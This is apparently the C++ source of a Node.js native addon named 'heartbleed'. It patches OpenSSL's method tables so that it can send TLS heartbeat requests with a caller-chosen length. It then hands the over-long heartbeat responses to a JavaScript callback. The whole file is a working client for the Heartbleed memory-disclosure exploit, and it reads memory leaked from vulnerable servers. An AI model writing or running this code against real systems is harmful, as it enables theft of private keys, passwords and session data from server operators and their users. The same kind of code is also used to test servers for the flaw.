#include "heartbleed.h"
#include "node_buffer.h"
#include "openssl/err.h"

#include <assert.h>

namespace heartbleed {

using namespace node;
using namespace v8;

static Persistent<String> onheartbeat_sym;
static int wrapper_index;
static SSLWrap* current_wrap_;

static MethodWrap<TLSv1_method> t1;
static MethodWrap<TLSv1_client_method> t1_client;
static MethodWrap<TLSv1_1_method> t11;
static MethodWrap<TLSv1_1_client_method> t11_client;
static MethodWrap<TLSv1_2_method> t12;
static MethodWrap<TLSv1_2_client_method> t12_client;

// Template static properties
template <MethodFunction M>
CtrlFunction MethodWrap<M>::ssl_ctrl_;
template <MethodFunction M>
DispatchAlertFunction MethodWrap<M>::ssl_alert_;


template <MethodFunction M>
MethodWrap<M>::MethodWrap() {
  SSL_METHOD* m = const_cast<SSL_METHOD*>(M());
  ssl_ctrl_ = m->ssl_ctrl;
  ssl_alert_ = m->ssl_dispatch_alert;
  m->ssl_ctrl = Ctrl;
  m->ssl_dispatch_alert = DispatchAlert;
}


template <MethodFunction M>
long MethodWrap<M>::Ctrl(SSL* s, int cmd, long larg, void* parg) {
  if (cmd != SSL_CTRL_GET_SESSION_REUSED)
    return ssl_ctrl_(s, cmd, larg, parg);

  if (current_wrap_ != NULL) {
    current_wrap_->WrapSSL(s);
    current_wrap_ = NULL;
  }

  // Faking out get session reused,
  void* buf = OPENSSL_malloc(3);
  uint16_t size = SSLWrap::UnwrapSSL(s)->get_heartbeat_length();
  reinterpret_cast<uint8_t*>(buf)[0] = TLS1_HB_REQUEST;
  reinterpret_cast<uint8_t*>(buf)[1] = size >> 8;
  reinterpret_cast<uint8_t*>(buf)[2] = (size & 0xff) | 1;
  M()->ssl_write_bytes(s, TLS1_RT_HEARTBEAT, buf, 3);

  return 0;
}


template <MethodFunction M>
int MethodWrap<M>::DispatchAlert(SSL* s) {
  SSL3_RECORD* rr = &s->s3->rrec;
  if (s->s3->send_alert[1] == SSL_AD_UNEXPECTED_MESSAGE &&
      rr->type == TLS1_RT_HEARTBEAT) {
    s->s3->alert_dispatch=0;
    ERR_clear_error();
    ProcessHeartbeat(s, rr);
    rr->length = 0;
    s->rwstate = SSL_READING;
    BIO_clear_retry_flags(SSL_get_rbio(s));
    BIO_set_retry_read(SSL_get_rbio(s));
    return 0;
  }

  return ssl_alert_(s);
}


template <MethodFunction M>
void MethodWrap<M>::ProcessHeartbeat(SSL* ssl, SSL3_RECORD* rr) {
  HandleScope scope;
  SSLWrap* w = SSLWrap::UnwrapSSL(ssl);
  if (w == NULL)
    return;

  if (!w->handle_->Has(onheartbeat_sym))
    return;

  Local<Value> buf = Local<Value>::New(Buffer::New(
        reinterpret_cast<const char*>(rr->data),
        rr->length)->handle_);
  MakeCallback(w->handle_, onheartbeat_sym, 1, &buf);
}


void SSLWrap::Initialize(Handle<Object> target) {
  HandleScope scope;
  Local<FunctionTemplate> t = FunctionTemplate::New(SSLWrap::New);

  t->InstanceTemplate()->SetInternalFieldCount(1);
  t->SetClassName(String::NewSymbol("SSLWrap"));

  NODE_SET_PROTOTYPE_METHOD(t,
                            "setHeartbeatLength",
                            SSLWrap::SetHeartbeatLength);

  target->Set(String::NewSymbol("SSLWrap"), t->GetFunction());
}


Handle<Value> SSLWrap::New(const Arguments& args) {
  HandleScope scope;

  SSLWrap* w = new SSLWrap();
  assert(current_wrap_ == NULL);
  current_wrap_ = w;
  w->Wrap(args.This());

  return args.This();
}


Handle<Value> SSLWrap::SetHeartbeatLength(const Arguments& args) {
  HandleScope scope;

  SSLWrap* w = ObjectWrap::Unwrap<SSLWrap>(args.This());
  w->heartbeat_length_ = args[0]->Uint32Value();

  return Null();
}


void SSLWrap::WrapSSL(SSL* ssl) {
  SSL_set_ex_data(ssl, wrapper_index, current_wrap_);
}


SSLWrap* SSLWrap::UnwrapSSL(SSL* ssl) {
  return static_cast<SSLWrap*>(SSL_get_ex_data(ssl, wrapper_index));
}


static void Initialize(Handle<Object> target) {
  wrapper_index = SSL_get_ex_new_index(0, NULL, NULL, NULL, NULL);
  // Skip app-data index
  if (wrapper_index == 0)
    wrapper_index = SSL_get_ex_new_index(0, NULL, NULL, NULL, NULL);
  assert(wrapper_index != 0);

  onheartbeat_sym = Persistent<String>::New(String::New("onheartbeat"));

  SSLWrap::Initialize(target);
}

}  // namespace heartbleed

NODE_MODULE(heartbleed, heartbleed::Initialize);
